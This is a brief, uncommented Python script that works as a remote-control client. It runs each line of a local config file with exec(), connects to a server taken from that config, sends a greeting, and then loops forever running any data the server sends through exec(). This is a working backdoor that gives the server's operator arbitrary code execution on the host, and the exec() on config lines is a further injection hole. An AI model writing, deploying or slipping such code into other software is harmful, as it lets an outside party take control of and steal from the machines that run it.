import time
import socket
import os
import sys

f = open("config/connection_config.txt", "r")

for line in f:
    
    exec('{}' .format(line))

f.close()

host = server_ip
port = server_port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
s.connect((host, port))

s.send(b'Hello')

while True:
    
    
    rawdata = s.recv(1024)
    exec(rawdata)
